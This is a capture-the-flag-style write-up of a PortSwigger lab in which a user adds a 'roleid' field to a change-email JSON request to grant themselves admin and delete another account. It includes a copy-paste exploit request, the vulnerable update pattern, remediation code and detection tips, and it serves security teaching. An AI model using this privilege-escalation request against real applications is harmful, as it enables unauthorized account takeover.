# User Role Can Be Modified in User Profile  

**Category**: 01-Broken-Access-Control  
**Lab_ID**: RoleID-JSON-Tamper-001  
**Source**: PortSwigger  
**Date_Completed**: 2025-11-04  
**Tag**: `Broken-Access-Control`, `Mass-Assignment`, `JSON-Tampering`, `Privilege-Escalation`, `Insecure-Deserialization`  

---

## Executive summary

The “Change Email” feature accepts **raw JSON** and blindly trusts every field, including the hidden `roleid`.  
By adding `"roleid":2` to the request body, any logged-in user can instantly promote themselves to administrator (`roleid=2`).  
Once admin, `/admin` becomes accessible and the “Delete carlos” button works with a single click.

**Result:** `wiener` → `POST /my-account/change-email` with `{"roleid":2}` → `roleid` updated → `/admin` → delete `carlos` → **SOLVED**.  
**Severity (subjective):** Critical — one-packet admin takeover.  
**Recommended immediate action:** **Never trust client-supplied object keys**; whitelist only `email`.

---

## Objective

Exploit mass assignment in the email-update JSON endpoint to change your own `roleid` to 2, access `/admin`, and delete the user `carlos`.

---

## Environment & tools

* Target: `0afd00e6037335f68124672c006f0090.web-security-academy.net`  
* Tools: Burp Suite (Proxy → Repeater) or browser DevTools  
* Credentials: `wiener:peter`  
* Endpoint: `POST /my-account/change-email` (Content-Type: `text/plain`)  
* Hidden field: `roleid` (1 = user, 2 = admin)

---

## Discovery  

1. Logged in → My Account → Update Email.  
2. Intercepted request → saw **raw JSON** in body.  
3. Response JSON contained `"roleid":1`.  
4. In Repeater, added `"roleid":2` → sent → response now `"roleid":2`.  
5. Refreshed `/admin` → panel loaded → deleted `carlos`.

> Finding: **No server-side allow-list** → any JSON key is accepted and persisted.

---

## Reproduction steps  

1. Log in as `wiener:peter`.  
2. Go to **My Account** → click **Update email**.  
3. Intercept in Burp → send to **Repeater**.  
4. Change payload to:  
   ```json
   {
     "email": "wiener@normal-user.net",
     "roleid": 2
   }
   ```  
5. Ensure `Content-Type: text/plain;charset=UTF-8` (lab quirk).  
6. Send → 200 OK with `"roleid":2`.  
7. Browse to `/admin` → click **Delete carlos** → lab solved.

**Exploit request (copy-paste ready):**
```
POST /my-account/change-email HTTP/2
Host: 0afd00e6037335f68124672c006f0090.web-security-academy.net
Cookie: session=KJftWPWZcw0cYWCwIugeWWmXCdTkssn5
Content-Length: 52
Content-Type: text/plain;charset=UTF-8

{
"email":"wiener@normal-user.net",
"roleid": 2
}
```

**Success response snippet:**
```json
{
  "username":"wiener",
  "email":"wiener@normal-user.net",
  "roleid":2
}
```

---

## Observed impact

* **Instant vertical escalation** for every authenticated user.  
* Full admin panel access → delete any account.  
* Works with any `roleid` value (try `1337` for fun).  
* No rate-limiting, no CSRF token, no audit log.

---

## Root cause analysis

* **Primary cause:** Mass-assignment vulnerability  
  ```python
  user.update(request.get_json())  # ← trusts every key
  ```  
* **Secondary causes:**  
  - JSON sent as `text/plain` (bypasses some parsers).  
  - Role echoed back to client (info leak).  
  - No allow-list / schema validation.

---

## Risk assessment

| Likelihood | Impact   | Overall   |
|------------|----------|-----------|
| Very High  | Critical | Critical  |

CVSS: **9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)**

---

## Remediation  

### Immediate (one-liner)
```python
user.email = data.get('email')
db.session.commit()
```

### Medium-term
1. **Whitelist fields**:  
   ```python
   allowed = {'email'}
   update_data = {k: v for k, v in data.items() if k in allowed}
   ```
2. Use **Pydantic / Marshmallow** schemas.  
3. Switch to **form-encoded** POST with CSRF.

### Long-term
- Role changes → separate admin-only endpoint + audit log.  
- Automated test:  
  ```bash
  curl -b cookie -d '{"roleid":2}' /my-account/change-email → 400
  ```

---

## Detection & verification guidance  

* Grep code for:  
  ```bash
  grep -R "get_json()" .
  grep -R "update(" .
  ```  
* In Burp: **add common privilege fields** (`admin`, `roleid`, `isAdmin`) to every JSON body.  
* ZAP/Burp active scan rule: “Mass Assignment”.

---

## Suggested tests to add

| Test                               | Expected |
|------------------------------------|----------|
| Send `roleid:2` as normal user     | 400      |
| Send `roleid:1337`                  | 400      |
| Omit `roleid`                      | 200      |
| Send malformed JSON                | 400      |

---

## References & further reading

* OWASP API Top 10 — **A1: Mass Assignment**  
* PortSwigger: “Excessive trust in client-side controls”  
* GitHub “mass-assignment” cheat sheet  

---

## Notes & lessons learned

* **Never echo internal fields** (roleid) to users.  
* **JSON = dangerous** without schema.  
* One extra key → full admin.  
* Burp “Add to scope → Engage → Find mass assignment” = 30-second win.

---

## Evidence & validation  

* Before: `GET /my-account` → `"roleid":1`  
* After exploit: `"roleid":2`
<img width="721" height="343" alt="Screenshot 2025-11-04 201814" src="https://github.com/user-attachments/assets/39b9bd9e-946c-43aa-87dd-bb73d8dd955b" />

* `/admin` loads → Delete carlos → 302  
* Lab banner: **SOLVED**
<img width="950" height="377" alt="Screenshot 2025-11-04 201746" src="https://github.com/user-attachments/assets/cb28ade5-cf79-445a-a906-0e8d2d05e82c" />

---

> **Legal & ethical reminder:** This writeup documents testing performed in a controlled PortSwigger lab environment. Do not apply these techniques to real systems without explicit authorization.
